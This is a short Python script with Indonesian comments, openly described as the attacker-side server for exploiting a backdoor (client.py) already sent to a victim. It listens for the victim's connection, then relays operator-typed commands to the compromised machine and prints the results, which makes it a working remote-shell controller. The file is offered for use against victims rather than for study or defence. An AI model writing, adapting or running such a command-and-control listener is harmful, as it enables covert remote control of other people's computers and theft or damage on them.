#server.py adalah sebuah source code yang kamu jalankan untuk mengexploitasi hasil backdoor yang tadi sudah dikirimkan ke korban(client.py) 
#Author by code Profesor Acc
import socket

HOST = 'taruh ip anda disini' # '192.168.43.82' # ip harus sama dengan (client.py)
PORT = 8081 # 2222 # port harus sama dengan (client.py)
server = socket.socket()
server.bind((HOST, PORT))
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')

while True:
    command = input('Enter Command : ')
    command = command.encode()
    client.send(command)
    print('[+] Command sent')
    output = client.recv(1024)
    output = output.decode()
    print(f"Output: {output}")
